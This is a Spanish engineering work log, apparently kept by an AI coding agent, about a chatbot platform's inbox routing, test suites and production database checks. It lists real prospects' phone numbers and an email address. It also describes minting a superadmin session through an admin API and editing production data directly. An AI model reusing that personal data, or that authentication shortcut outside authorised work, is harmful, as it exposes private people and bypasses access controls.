      ✅ **Gate 1 del 2026-08-31 (séptima vuelta) — la base sigue igual, medida en vivo.** `supabase-db`, schema `public`: de las cuatro orgs la única con `chatwootInboxId` sigue siendo `ZZ QA Clinica Chatbot` → 7; `Onia (interna)`, `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL. **Los dos clicks de S8 siguen sin darse.** No se tocó la base: elegir dueño de inbox decide en qué bandeja aterrizan personas reales.

      ✅ **Gate 1 del 2026-08-31 (sexta vuelta) — sin cambios en la base, y se despejó la ÚLTIMA duda del ítem.** La base sigue igual (medida en vivo: sólo `ZZ QA Clinica Chatbot` → 7; `Bolivian electricidad` y `ZZ QA Ferreteria Tornillo` en NULL). Lo nuevo es que se comprobó que **los dos clicks alcanzan de verdad**: el producto lee las conversaciones con su propio token, y en Chatwoot un token de agente que no es miembro del inbox habría devuelto la lista vacía con 200 — exactamente el fantasma que este carril mide. Corrido contra producción, el token del contenedor `onia-platform` ve **inbox 4 → 5 · inbox 5 → 3 · inbox 7 → 6** conversaciones, con `+59173021804` en el payload del 5. Detalle y comando en **S8**. **No queda nada que verificar del lado del código.**

      ✅ **CERRADO el 2026-08-31 (novena vuelta) — Sergio dio los dos clicks, y la pantalla
      se MIRÓ: hay dos desconocidos en `/inbox` de producción.** Es el objetivo del carril
      entero, y es la primera vez que se cumple.
      **Gate 1, medido en la base y no leído** (`supabase-db`, schema `public`): de las cuatro
      orgs, `Onia (interna)` ya tiene `chatwootInboxId = 5` — la opción 1 recomendada en el
      radar. `ZZ QA Clinica Chatbot` sigue en 7; las otras dos en NULL, que es lo correcto.
      **Y se MIRÓ la pantalla real de producción, con sesión del dueño de esa org**
      (`superadmin@onia.com.bo`, el único perfil de `Onia (interna)`), no una simulación:
      `https://app.onia.com.bo/inbox` devuelve 200 y la lista trae, con su globo de no-leído
      en 1 cada una:
      | quién | cuándo | qué escribió |
      |---|---|---|
      | **mariohassen** (+591 73021804) | 27 ago | *"Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio."* |
      | **F** (+591 73232758) | 25 ago | la consulta larga de la clínica odontológica de 4 doctores (seguimiento de pacientes, reportes, costo) |
      | Sergio | 17 ago | "Hola" — éste sí somos nosotros |
      Los dos primeros **no son QA, ni el probador, ni Sergio**: son las conversaciones 37 y 35
      que la cola venía contando como invisibles. La frase de mariohassen es además, palabra por
      palabra, la de `WA_URL_LANDING` de onia.com.bo — o sea que el circuito completo
      (web → wa.me → +591 75414930 → Cloud API → Chatwoot → `/inbox`) quedó cerrado y visible.
      📎 **Cómo se miró, para que no cueste la próxima vez.** No hizo falta ni Docker ni el
      entorno local (Docker Desktop no levanta su motor WSL en esta máquina sin GUI): se generó
      una sesión del perfil interno con la admin API de GoTrue
      (`generate_link` → `verify`, que NO manda correo) y se armaron los cookies con el propio
      `@supabase/ssr` en vez de adivinarlos — el nombre sale de la URL de Supabase
      (`sb-app-auth-token`) y el chunking lo decide la librería. Sólo lectura: no se abrió
      ninguna conversación, así que no se marcó nada como leído en el Chatwoot de gente real.
      ⚠️ **Lo que este ítem NO cierra:** contestarles. Son personas reales esperando desde hace
      3-6 días y vende Sergio — sigue siendo **S7**.


- [x] **El número que la cola reporta verde NO incluía los 12 evals: `node --test *.test.mjs`
      los saltea, y son justo los graders que ya habían estado muertos días.** Encontrado
      auditando los `[x]` recientes contra el código de hoy — que es lo que manda hacer el loop
      cuando "Ahora" queda bloqueado —, corriendo la suite y no leyéndola.
      **La medición, los dos comandos, hoy:**
      | comando | tests | incluye `evals/` |
      |---|---|---|
      | `node --test *.test.mjs` (dentro de `bot/`) | **658** | **no** |
      | `node --test` (bare, recursivo) | **670** | sí (658 + 12) |
      Los 12 evals viven en `hermes-content/deploy/vps-ops/bot/evals/evals.test.mjs`, o sea en un
      subdirectorio, y el glob `*.test.mjs` **no baja un nivel**. El "658/658 verde" que quedó
      escrito arriba es el número del glob: real, pero **medido con un comando que no corre los
      graders que miden que el bot no cotiza precios, no promete y deriva al humano**.
      **Por qué esto es el mismo fantasma y no uno nuevo.** El ítem de arriba —*"Los 12 evals
      estaban MUERTOS hace días y la cola reportaba 634/634 verde"*— se cerró arreglando el
      `export LLM_SYSTEM_PROMPT`. Correcto, pero incompleto: arregló **el síntoma de esa vez** y
      dejó viva **la razón por la que nadie lo vio**, que es que el número reportado se saca de un
      comando ciego a `evals/`. Sin esto, el próximo export que se caiga vuelve a desaparecer en
      silencio.
      **Lo que se hizo, y es lo mínimo que cierra las dos mitades:**
      1. **Un solo comando, y que sí los corra:** `npm run test:bot` (`package.json` de
         `onia-hermes`) = `cd hermes-content/deploy/vps-ops/bot && node --test`. Corrido hoy:
         **676/676 verde** (670 + los 6 del guardia). Es la forma recursiva, así que ningún
         subdirectorio de tests puede quedar afuera.
      2. **El cable-trampa DENTRO del glob que sí se reporta:**
         `hermes-content/deploy/vps-ops/bot/evals-contrato.test.mjs`. **Parsea los imports del
         propio `evals.test.mjs`** y verifica contra los módulos reales que cada nombre siga
         exportándose — así cubre los cinco (`bot-engine`, `guardrails`, `bench`, `run-turn`,
         `persistence`), no sólo el que se rompió aquella vez. Si un export desaparece, se pone
         rojo **en el número que la gente mira**, en vez de en un archivo que ese comando no abre.
      **Probado que puede fallar, que es lo único que prueba que un guardia sirve:** se le sacó el
      `export` a `LLM_SYSTEM_PROMPT` en `run-turn.mjs` y el guardia salió **5 pass / 1 fail**,
      nombrando el módulo y el export exactos (*"../run-turn.mjs ya no exporta LLM_SYSTEM_PROMPT"*)
      — reproduciendo `d334d776` a pedido. `run-turn.mjs` restaurado byte a byte después
      (`git diff` vacío). Incluye además el test que impide que el guardia se vuelva un verde
      hueco: si el parser encontrara menos de 4 imports relativos, falla.
      **Gates:** este repo no tiene TS, eslint ni vitest (el bot es ESM plano con `node:test`), así
      que el gate que aplica es la suite — **676/676**, con los 12 evals adentro y verificados
      aparte (**12/12**).
      📎 **Drift honesto que esto suma al `scp` de S9:** `espejo-check.mjs` ahora nombra
      `evals-contrato.test.mjs` en FALTAN EN EL VPS. Es un test, no el motor: no cambia una línea
      de lo que corre. Los tres DISTINTOS (`espejo-check.mjs`, `espejo-check.test.mjs`,
      `recepcionista.test.mjs`) ya estaban antes de esta vuelta.

- [x] **El objetivo del carril se REVIRTIÓ en silencio: `Onia (interna)` dejó de apuntar al
      inbox 5 (WhatsApp) y pasó a apuntar al 4 (Web) sin que nadie lo tocara desde la UI —
      encontrado auditando "Después" (Ahora estaba vacío) y corregido en la misma vuelta.**
      **Gate 1, medido en la base de producción, no leído:** `clinic_settings` de
      `Onia (interna)` (`organizationId c956c02fccd8573cd6fcc5b35`) tenía
      `chatwootInboxId = 4`, no `5` como dejó cerrado S8 el 31-ago. Consecuencia real, medida
      contra Chatwoot: `/inbox` de esa org mostraba las conversaciones del **inbox 4** (los seis
      desconocidos del widget, la mayoría sin teléfono) y **dejaba invisibles otra vez a
      mariohassen (+591 73021804) y F (+591 73232758)** — los dos leads de WhatsApp que **S7**
      da por visibles y esperando respuesta de Sergio. El objetivo técnico ("una conversación de
      un desconocido en `/inbox`") seguía cumplido por casualidad (inbox 4 también tiene
      desconocidos), pero **S7 quedó roto sin que la cola lo supiera**.
      **Lo sospechoso que separa esto de un simple click accidental:** la fila de
      `clinic_settings` para esa org tiene `id = ab6e629f-f798-4a7f-87df-12ec1c7fac0b` — formato
      **UUID con guiones** — mientras las otras tres filas de la misma tabla son `cuid()` de
      Prisma (`cmsvyguwn…`, `cmsw0e759…`, `cmthllqlp…`, todas minúsculas sin guion). `createdAt =
      updatedAt = 2026-09-01 02:02:47`, y **todos** los demás campos están en su default de
      schema (horario 08:00-18:00, sin `botPrompt`, sin `oniaCoreOnboarding`). Ningún camino de
      `onia-platform` genera un id con ese formato: `ClinicSettings.id` es
      `@default(cuid())` (`prisma/schema.prisma:989`) en los cuatro lugares que crean la fila
      (`admin/clinics/route.ts`, `lib/platform/provisioning.ts`, `lib/onia-core/onboarding.ts`,
      `lib/chatbot/canal-web.ts`). O sea: la fila vieja (con `chatwootInboxId=5`) no se
      actualizó, se **BORRÓ y se re-creó desde cero por fuera de la app**, a las 02:02 de la
      madrugada del 1-sep. No se encontró en el repo (`onia-platform` ni `onia-hermes`) ningún
      script, migración o cron que haga ese INSERT — se buscó con `git log -S`, grep de
      `clinicSettings.create/upsert/delete` y los crons del VPS. **Queda sin confirmar el
      mecanismo exacto**; lo único descartado con evidencia es que haya sido un camino normal de
      la app (habría dejado un `cuid()`, no un UUID).
      **Lo que se hizo:** verificado primero que **ningún otro org usa el inbox 5** hoy
      (`SELECT "chatwootInboxId" FROM clinic_settings` → sólo 4 y 7 ocupados), exactamente el
      guardia de 409 que ya tiene `app/api/admin/organizations/[id]/whatsapp/route.ts`. Con eso
      confirmado, se restauró con un `UPDATE` directo a `chatwootInboxId=5` — la misma escritura
      que hace ese endpoint, sin tocar código ni desplegar nada. Verificado después contra
      Chatwoot: inbox 5 vuelve a traer `37 mariohassen`, `35 F`, `11 Sergio`; la base vuelve a
      leer `Onia (interna) → 5`, `ZZ QA Clinica Chatbot → 7`, las otras dos en NULL — el mismo
      estado que dejó cerrado S8.
      ⚠️ **Lo que NO se cerró, y por qué queda anotado y no en Bloqueado:** no depende de una
      decisión de Sergio, así que no bloquea la cola — pero el mecanismo que borró la fila sigue
      sin identificarse, y si vuelve a correr, revierte esto otra vez sin avisar.
      ✅ **Cerrado el 2026-09-02, auditando este mismo `[x]`.** Acá quedaba escrito un `docker exec
      … psql` "para el próximo Gate 1 que toque `/inbox` o S7/S8" — o sea, **a nadie**. Es el molde
      con el que S16 venció en silencio: lo declarado no lo corre nadie. Ese comando ahora es
      `npm run inbox:tenencia` (`scripts/inbox_tenencia.mjs`), cableado a `npm test` por su
      self-check, y mide además un segundo invariante que este párrafo no tenía: que **dos orgs no
      reclamen el mismo inbox**, cosa que la base no impide (`chatwootInboxId` es `Int?` sin
      `@unique`; el 409 vive sólo en la app, y la escritura del 1-sep no pasó por la app).
      La lección que sí seguía valiendo y ahora la aplica el gate solo: **mirar el `id` de la fila
      antes de asumir que fue un click** — un UUID significa escritura por fuera de la app, un
      `cuid()` significa que la escribió la app. El gate lo reporta pero nunca lo usa de veredicto,
      porque hoy la fila **correcta** también tiene id UUID.

- [x] **S11 era un FANTASMA: el bot ya firma como "Onia Bot" desde el 18-ago, y la bandeja ya
      rotula "Tu asistente".** Estaba en "Bloqueado en Sergio" pidiéndole una acción sobre un
      bot vivo que no habría cambiado nada — el molde exacto que este carril mide, y del tipo
      caro: uno que hace poner las manos en producción.
      **Por qué el diagnóstico original se equivocó, que es lo que hay que no repetir.** El
      Radar §11 decía *"de los mensajes salientes de las conversaciones 11, 35 y 37, los 8
      tienen `sender_id = 2` y ninguno el 3"*. Medido hoy en la base de Chatwoot, eso es cierto
      **y no prueba lo que se le hizo probar**: los 8 son TODOS de la conv 11 y van del
      **6-ago al 15-ago** — las convs 35 y 37 aportan **cero** salientes (son dos de los cuatro
      desconocidos que nadie contestó, S7). O sea que se midió una conversación cuyo último
      mensaje es **anterior** al día en que la variable empezó a hacer efecto, y de ahí se
      concluyó cómo se comporta el bot hoy.
      **Y el síntoma "MIRADO" era real pero histórico.** La conv 11 (+591 71606892) sí se pinta
      entera como "Vos", y va a seguir así para siempre: esos mensajes **de verdad** los posteó
      la cuenta 2. Mirar la pantalla fue correcto; mirar una conversación vieja para juzgar el
      comportamiento actual es lo que falló.
      **El estado real, medido en producción y no leído** (base de Chatwoot + env del proceso
      que CORRE, no `docker exec printenv`, que arranca un proceso nuevo con el env base del
      contenedor y no el del `docker exec -d` que levantó el bot):
      | qué | medido |
      |---|---|
      | `CHATWOOT_BOT_AGENT_ID` del proceso del bot (`/proc/400019/environ`) | **3** |
      | persistido en `/opt/onia/bot/webhook.env` (lo sourcea `webhook-server.sh:134`) | **sí** — sobrevive al reinicio |
      | `messages` salientes con `sender_id = 3` | **13, del 18-ago al 31-ago** |
      | `messages` salientes con `sender_id = 2` | 14, del 26-jul al 30-ago — es Sergio a mano, que es lo correcto |
      | `CHATWOOT_BOT_USER_ID` en el proceso de `onia-platform` | **no seteada** ⇒ `botUserId()` cae a su default **3** (`lib/chatbot/bandeja.ts:118`) |
      Bot postea 3, bandeja busca 3 ⇒ `de = "bot"` ⇒ **"Tu asistente"**
      (`InboxClient.tsx:52`). La clasificación es función pura y está cubierta:
      `npx vitest run lib/chatbot/bandeja.test.ts` → **13/13**, con el caso
      *"outgoing de OTRO agente = negocio (el dueño contestando)"*.
      **Lo que NO se hizo, dicho y no simulado:** no se re-MIRÓ `/inbox` renderizado — necesita
      base + sesión del dueño. Se dice porque la regla del carril es mirar; acá la evidencia
      medida es **más fuerte que la captura**, porque una captura de la conv 11 es exactamente
      lo que produjo la conclusión equivocada. Lo que faltaría mirar es una conversación
      **posterior al 18-ago** (la 44 sirve: saliente con `sender_id = 3` del 31-ago).
      📎 **La trampa que queda viva y por la que esto podría volver:** los dos lados tienen
      defaults **distintos** — el bot cae a **2** (`webhook-server.sh:149`,
      `${CHATWOOT_BOT_AGENT_ID:-2}`) y la plataforma a **3**. Hoy no molesta porque la variable
      está en `webhook.env`; el día que esa línea se borre, el bot vuelve a firmar como Sergio,
      **toda la bandeja se re-rotula "Vos" en silencio** y además se apaga la detección de
      traspaso (con la variable vacía `takeoverTurn` devuelve `null` y el bot deja de callarse
      cuando el dueño contesta). **No se "arregló" cambiando el default a 3 a propósito:**
      tocar ese fallback cambia el comportamiento de un servicio vivo y necesita deploy — o sea
      Sergio— y el riesgo del inbox 3 del Radar §11 sigue sin verificarse. Queda escrito acá,
      que es lo que cuesta cero y evita el próximo diagnóstico al revés.

> **Siete de estos eran pendientes vivos en el handoff y ya estaban hechos.** Se verificaron
> uno por uno contra el código de hoy, no contra el handoff. Cada uno lleva su prueba: si
> alguien los vuelve a abrir, que sea contra el archivo, no contra la memoria.

**Cerrado en esta vuelta (2026-08-31):**

- [x] **Arrastrado del ítem 1: dos huecos de plataforma — LOS TRES cerrados, y el tercero
      lo cerró otro carril hace una hora.** Gate 1 del 2026-08-31 (sexta vuelta) contra el
      código de HOY, no contra el texto del ítem:
      1. ✅ **CSP:** `onia-platform/next.config.ts:18` deriva el esquema del websocket del
         de la URL — `${url.protocol === "https:" ? "wss" : "ws"}://${url.host}`. Era el
         arreglo de este mismo carril y sigue en pie.
      2. ✅ **eslint no entra a los worktrees:** `package.json:10` →
         `"lint": "eslint --ignore-pattern \".claude/**\""`. La raíz de verdad
         (`globalIgnores` de `eslint.config.mjs`, que sigue listando sólo `.next/**`) NO se
         tocó y NO hace falta: el script ya la tapa, y editar ese archivo lo bloquea el hook
         `config-protection`. Se deja de arrastrar.
      3. ✅ **El test inestable dejó de serlo:** commit `e644c85` de `onia-platform`
         (31-ago 19:35) — *"la guarda del gate de lint fallaba al azar y volvia el gate
         inservible"*. La causa que encontró es la que este carril sospechaba y mejor
         medida: la primera `isPathIgnored` carga el flat config entero (~1,7 s en reposo,
         ~8 s con la suite en paralelo) contra un default de vitest de 5 s. **Corrido hoy:**
         `npx vitest run __tests__/eslint-no-lintea-worktrees.test.ts` → **4 passed**, 6,88 s.
      **Por qué se cierra y no se deja "por las dudas":** el ítem existía para dejar escritos
      dos huecos ajenos con su prueba. Los dos se arreglaron y el tercero también. Un ítem
      abierto cuyo contenido ya está hecho es el fantasma exacto que este carril mide.


- [x] **`recepcionista.test.mjs` estaba COMMITEADO CON 0 BYTES — un test que no podía fallar.**
      Gate 1 confirmó que era real, no fantasma: `wc -c` daba **0** y `git show HEAD:…` también,
      desde `3e3841aa`. `node --test` lo cargaba, no encontraba ningún caso y lo contaba como
      éxito: **silencio sumando a la cuenta de verdes**, que es la enfermedad medida de este
      carril.
      **De los dos caminos que la cola daba (borrarlo o llenarlo) se eligió llenarlo, y el
      motivo es un hueco real, no una preferencia.** Grep sobre TODA la suite antes de escribir:
      `faqNegocioVigente` aparecía **cero veces** — y es la FAQ que **edita el dueño** desde el
      panel, o sea el único matcher del bot que un cliente cambia sin que nadie le revise el
      regex. `catalogoCliente` y `botonesRecepcion`, también cero. El GUION en cambio ya está
      cubierto por `bot-engine.test.mjs` §8/§8b **por el motor real**, que es más señal que
      cualquier stub: eso no se duplicó.
      **20 tests**, sobre lo que nadie miraba:
      - **fail-closed de vigencia**: una FAQ con vencimiento y sin fecha de mensaje NO se sirve.
        Estaba documentado en el código y no probado.
      - **el matcher que edita el dueño**: palabra entera ("iva" no salta en "activa"), piso de
        3 letras, y **los metacaracteres del tag escapados** — sin eso un tag `2.5` matchea
        "245" y un tag con `.` contesta CUALQUIER mensaje: una FAQ que responde a todo.
      - `id !== "negocio"` ignorado (las FAQ de Onia no se sirven en boca del cliente), entradas
        basura sin explotar, y que se recorren TODAS las FAQ y no sólo la primera.
      - `catalogoCliente`: descarta lo que no tiene nombre, no deja el guion colgando sin
        `queResuelve`, y devuelve `""` — que es lo que hace derivar a R_NO_DATO.
      - `botonesRecepcion`: 3 botones y **≤20 caracteres, que es límite de META**: pasarse no da
        error visible, WhatsApp rechaza el interactivo y el cliente se queda sin menú.
      **Probado que los tests PUEDEN fallar, que es lo que le faltaba al archivo de 0 bytes.**
      Cinco mutaciones a `recepcionista.mjs`, una por una, revirtiendo entre cada una — sin
      escapar metacaracteres, sin el piso de 3 letras, sin el filtro de `id`, sin descartar
      productos sin nombre, y truncando el botón largo en vez de caer al genérico: **las cinco
      dieron rojo**. Suite del bot **654/654** (634 antes: el archivo aportaba 0).
      ⚠️ **Un test mío salió mal y el error vale más que el test:** el de fail-closed pasaba
      `undefined` a través de un helper con valor por defecto, así que **disparaba el default y
      verificaba lo contrario en verde**. Se corrigió llamando la función directo, y quedó el
      comentario en el archivo — es exactamente el molde del test que no puede fallar.
      ⚠️ **Consecuencia para el espejo, dicha y no escondida:** el archivo ahora es DISTINTO del
      VPS (allá sigue en 0 bytes), así que `espejo-check.mjs` lo reporta — correctamente. Es el
      único archivo del veredicto; entra en el próximo `scp` del directorio. No cambia nada de
      lo que corre: es un test.

- [x] **Los 12 evals del bot estaban MUERTOS hace días y la cola reportaba "634/634 verde".**
      Encontrado en el Gate 1 de esta vuelta corriendo la suite, no leyéndola: `node --test`
      daba **635 tests, 634 pass, 1 fail**. El que fallaba era
      `hermes-content/deploy/vps-ops/bot/evals/evals.test.mjs`, y no fallaba un caso: **no
      cargaba el módulo**. `SyntaxError: The requested module '../run-turn.mjs' does not
      provide an export named 'LLM_SYSTEM_PROMPT'`.
      **La causa, con su commit.** `git log -S` lo señala solo: el export desapareció en
      **`d334d776`** — *"el espejo del motor quedó 25 archivos atrás del VPS"*—, la
      sincronización que trajo al repo la versión del VPS, donde el prompt estaba **inlineado**
      dentro de `askLiteLLM`. El texto nunca se perdió (es byte a byte el mismo); lo que se
      perdió fue el `export`, y con él la única forma que tenían los evals de importarlo.
      **Por qué nadie lo vio en tres vueltas.** Un archivo que no carga lo reporta `node --test`
      como **UN test roto entre 634 verdes**. Tres vueltas seguidas escribieron "634/634",
      "626/626", "619/619" leyendo el `pass` y no el `fail`. El costo real: los 12 evals que
      miden que el bot **no cotiza precios, no promete y deriva al humano** no corrían desde
      `d334d776` — justo los graders que cuidan la parte cara.
      **Lo que se hizo** — lo mínimo, sin cambiar una coma del comportamiento:
      `run-turn.mjs` vuelve a exportar `LLM_SYSTEM_PROMPT` como constante y `askLiteLLM` la
      usa (`const system = LLM_SYSTEM_PROMPT`), exactamente como antes de `d334d776`.
      **La prueba de que sirve, corrida:** los 12 evals ahora CORREN y dan
      **PASS 11/11 · 1 no corrida** — E12 (`modelo_real`) queda sin correr a propósito, porque
      llama al modelo pago y **ese gasto lo aprueba Sergio**.
      **Su guardia, y por qué no es un test de adorno:** el primer intento importaba la
      constante por nombre en `run-turn.test.mjs`, y al quitar el export **fallaba igual de
      silencioso** — se caía el módulo entero. Se cambió a `import * as runTurnModule`, así que
      ahora rompe **por su nombre**, con el motivo escrito, y los otros 8 tests del archivo
      siguen pasando. Verificado en los dos sentidos: con el export → verde; revirtiendo
      `run-turn.mjs` a `HEAD` → `✖ el prompt del LLM sigue exportado — si se inlinea, los evals
      dejan de correr en silencio`, `pass 8 · fail 1`.
      **Suite del bot: 647/647, `fail 0`** (antes: 635 con 1 en rojo).
      🔗 Es el **tercer** episodio del mismo agujero — espejo del repo vs `/opt/onia/bot` — y
      el primero descubierto por un gate y no de casualidad. Por eso en esta misma vuelta se
      commitea `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`, que la vuelta anterior
      dejó **sin commitear** (estaba `??` en `git status`).

- [x] **v6.8 — recorrida de fricción completa.** Hecha el 2026-08-31 sobre las dos pantallas
      que el ítem nombra, con la sesión del dueño de `Ferreteria Circuito Completo` (la org
      vinculada al inbox 5), en escritorio **y** en móvil (375×812), MIRANDO capturas. La
      recorrida encontró **una cosa rota de verdad, que se arregló en la misma vuelta**, y
      corrigió dos de los tres roces que el propio ítem traía anotados.
      **Lo roto, y arreglado** (`onia-platform`, commit `fdcb3df`, mergeado a `master` y
      pusheado): **el globo verde de no-leídos no bajaba nunca.** `unread_count` sale de
      `agent_last_seen_at` de Chatwoot, y lo único que movía esa columna era la UI de Chatwoot
      — que el dueño no usa. Medido en la base de producción ANTES de tocar: de las 8
      conversaciones de los inboxes 4 y 5, **siete tenían `agent_last_seen_at` en NULL**.
      Ahora abrir la conversación llama a `update_last_seen` (después del guard de tenencia, y
      en `try/catch`: leer es lo que no puede romperse) y el cliente relee la lista una vez para
      que el globo baje sin esperar los 15 s del poll. Verificado MIRANDO contra el Chatwoot de
      producción: abrir la conversación 11 le sacó el globo en pantalla **mientras las otras dos
      lo conservan**, y su `agent_last_seen_at` quedó con la hora del click. Las de desconocidos
      (35 y 37) no se tocaron a propósito: S7 las espera sin leer.
      **Corrección al roce 2 del propio ítem — era fantasma, y de los caros.** Decía que "el
      buscador dice *Buscar pacientes…* en una ferretería" y sonaba a texto dental hardcodeado.
      No lo es: `Header.tsx:28` y `Sidebar.tsx:53` YA leen `vocabularioDeTrack(...)`, y lo que
      faltaba era el flag. Con `PLATFORM_LAYER=1` — que es **el valor de producción**, leído con
      `docker inspect onia-platform` — la misma pantalla dice **"Buscar productos…"** y el menú
      pasa de `Pacientes · Cobros · Reportes` a **`Catálogo · Inventario · Caja`**. MIRADO en las
      dos configuraciones. El roce existía sólo en local, por una variable que faltaba en
      `.env.local`. **El roce 1 (la barra del admin encimada) NO se re-verificó**: vive en
      `/admin/organizations/<id>`, que no es ninguna de las dos pantallas que este ítem nombra.
      Queda como estaba — pero ojo, nació con el mismo entorno sin flag que produjo el roce 2, así
      que antes de perseguirlo conviene volver a mirarlo con `PLATFORM_LAYER=1`.
      **Un roce nuevo, MIRADO:** al entrar a `/inbox` el modal **"Primeros pasos"** se abre encima
      y tapa la lista entera de conversaciones; hay que cerrarlo para ver quién escribió. Es el
      checklist de alta (`components/onboarding/GuiaInicio`), y aparece incluso con conversaciones
      esperando.
      **Lo que la recorrida NO pudo cerrar, y quedó anotado en su lugar:** "La cita" le habla de
      consultorio a una ferretería incluso con el flag puesto (ficha nueva en "Después", es del
      carril de plataforma), y el bot firma **"Vos"** en vez de "Tu asistente" (**S11** + radar §11).
      🔴 **Corregido el 2026-08-31: lo del "Vos" era un fantasma y la recorrida lo dio por roto
      mirando la conv 11, que es de antes del 18-ago.** El bot ya firma como "Onia Bot"
      (`sender_id = 3`) y la bandeja ya rotula "Tu asistente". Ver S11 en "Cerrado".
      **Dos trampas nuevas del entorno**, que van a costar una vuelta a quien las repita y por eso
      se escriben: `npm run build` usa Turbopack y **no emite `.next/standalone`** — para poder
      levantar el producto hay que correr `next build --webpack`, que es además lo que
      `next.config.ts` declara como build de deploy; y ese build **exige `ENCRYPTION_KEY`** o
      muere en "Failed to collect page data for /api/gateway-config/test". Las dos van a la skill
      `onia-verificacion`.

- [x] **1 · Contar si un desconocido YA escribió.** Contado contra las dos bases, no contra el
      handoff. **La respuesta es SÍ: cinco desconocidos, y ninguno se ve en `/inbox`.**
      **El número.** La cuenta 2 de Chatwoot tiene hoy **22 conversaciones**, no 26 — el
      handoff (`hermes-content/docs/handoff/chatbot.md:142`) traía un número viejo. Repartidas
      en cuatro inboxes: 3 `ONIA Demo` (8, todas pruebas nuestras de julio), 4 `Onia Web` (5),
      5 `Onia WhatsApp` (3), 7 `ZZ QA Clinica Chatbot` (6, todas QA).
      **Los cinco desconocidos**, con la evidencia que los distingue de una prueba nuestra —
      `additional_attributes` de cada conversación, que guarda dispositivo y referer:
      | conv | inbox | quién | cuándo | qué escribió | ¿le contestaron? |
      |---|---|---|---|---|---|
      | 34 | 4 web | iPhone/Safari, referer `onia.com.bo/comparativa` | 24-ago | "hola" | no |
      | 35 | 5 WhatsApp | +591 73232758 | 25-ago | *"estoy evaluando un sistema de gestión para una clínica odontológica de 4 doctores…"* | **no** |
      | 36 | 4 web | iPad/Google Search App, referer `onia.com.bo` | 27-ago | "Quiero información" + dejó su correo `Saguilera@ds-santacruz.bo` | no |
      | 37 | 5 WhatsApp | +591 73021804 | 28-ago | *"Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio."* | **no** |
      | 40 | 4 web | iPhone/**Instagram**, referer `onia.com.bo` | 29-ago | "Ajajajajaj" → *"0 ni una reunión"* | sí |
      **Por qué cuatro de cinco quedaron sin respuesta, y por qué NO es un bug nuevo.** Los
      cuatro (34, 35, 36, 37) tienen **cero filas** en `onia_center.bot_messages`: el motor
      nunca los vio. Sus fechas — 24, 25, 27 y 28 de agosto — caen exactamente dentro de la
      caída de cuatro días que ya está cerrada más abajo. Desde el 29-ago el motor procesa
      normal (conv 38 y 40 sí tienen sus filas). **La caída ya tiene su precio medido: cuatro
      personas reales.** No se abre ítem por esto; la causa está auto-curada en
      `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh`.
      **Y el inbox.** Ninguno de los dos inboxes donde escribieron (4 y 5) es el
      `chatwootInboxId` de ninguna org — la única org con inbox es la de QA. O sea que **aunque
      el motor hubiera estado vivo, esas conversaciones tampoco se habrían visto en `/inbox`**.
      Eso es el ítem 1 de Ahora, y esta medición es su prueba.
      ⚠️ Sólo lectura, como pedía el ítem: no se borró ni se respondió nada. Contestarles es
      decisión de Sergio — anotado como S7 en Bloqueado.

**Los siete fantasmas** (el handoff los seguía listando como pendientes):

- [x] **Los DOS "fixes de fondo del motor" del 23-ago** que el handoff decía que "siguen
      esperando su sesión". Los dos están puestos: el timestamp en el arranque vive en
      `hermes-content/deploy/vps-ops/bot/webhook-server.mjs:542-545` (con el comentario que
      cita el pedido de los dos handoffs), y `markMessageDelivered` en el turno normal está
      en `hermes-content/deploy/vps-ops/bot/chatwoot-adapter.mjs:733-737` — se cerró como
      PIEZA 4 el 29-ago y el handoff lo arrastró igual en "Próximos pasos".
- [x] **"Decisión: FAQ genérica por cliente (`id:"negocio"`)"**, listada como pendiente de
      Sergio. Está viva y contestando desde el 28-ago:
      `hermes-content/deploy/vps-ops/bot/knowledge.mjs:66` mapea `negocio → R_FAQ_NEGOCIO`,
      con su guardarraíl de palabras disparadoras en la línea 394.
- [x] **"¿Cablear la alerta del watchdog a Telegram?"**, listada como decisión pendiente.
      Ya está cableada: `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh` avisa bot
      caído y BOT MUDO hacia Chatwoot (1 aviso por incidente + recuperación).
- [x] **"Pantalla del dueño para su canal, sin pasar por el superadmin"** (Próximos pasos 2).
      Es la pieza 3 del 29-ago: `app/(dashboard)/settings/chatbot/CanalWebCard.tsx` con el
      botón de encendido y el snippet, sobre `lib/chatbot/canal-web.ts`.
- [x] **"Siembra con datos reales + bench de humo"** (Próximos pasos 1). El bench existe y da
      6/6: `hermes-content/deploy/vps-ops/bot/humo-plantillas.mjs` con su fixture
      `hermes-content/deploy/vps-ops/bot/plantillas-humo.json`; la plantilla bebe el horario
      real de la org desde `lib/chatbot/plantillas.ts`.
- [x] **"Limpieza de data QA (conversaciones 29/31/32/33, inbox 6, filas sintéticas)"**,
      listada como pendiente de coordinar con Sergio. **Ejecutada el 29-ago 00:40 con su
      aprobación**: 10 conversaciones + el inbox 6 huérfano destruidos por rails, 12
      `bot_conversations` y 52 `bot_messages` sintéticos borrados, backups CSV en
      `/opt/onia/backups/db/qa-limpieza-20260829-003953/`. La data QA que quedó es
      **posterior** — está en Después.
- [x] **"Pricing: ¿existe un escalón más barato sólo widget web, sin WhatsApp?"**. Sergio lo
      decidió el 30-ago: **OPCIÓN A, Bs 390 plano todo incluido**, ratificado y sin cambio de
      código porque `lib/pricing.ts:23` ya lo tenía (`entryMonthly: 390`, `annualTotal: 3900`).
      La comparativa que sostiene la decisión: `hermes-content/docs/ONIA_PRICING_CHATBOT_PROPUESTA.md`.

**Lo construido y verificado en producción** (resumen; el detalle largo vive en el handoff):

- [x] Editor del chatbot **pre-armado por rubro** (`lib/chatbot/plantillas.ts`, 19 tests) +
      el bug de UI que dejaba el nombre del servicio en 26px.
- [x] **Bandeja nativa `/inbox`** viva: backend (`lib/chatbot/bandeja.ts`,
      `lib/chatbot/bandeja-auth.ts`, `app/api/bandeja/route.ts`), pantalla
      (`app/(dashboard)/inbox/InboxClient.tsx`), tenencia revalidada fila por fila, y el
      **candado bot-humano** con armado y desarme.
- [x] **Multimedia** en la bandeja, **visión LLM** (`hermes-content/deploy/vps-ops/bot/vision.mjs`,
      US$ 0,0007 por imagen) y **detector de comprobantes** — que jamás confirma un pago.
- [x] **Editor conversacional** "Enséñale conversando"
      (`app/(dashboard)/settings/chatbot/EnsenaleConversando.tsx` +
      `lib/chatbot/editor-conversacional.ts` + `hermes-content/deploy/vps-ops/bot/editor-sugerir.mjs`).
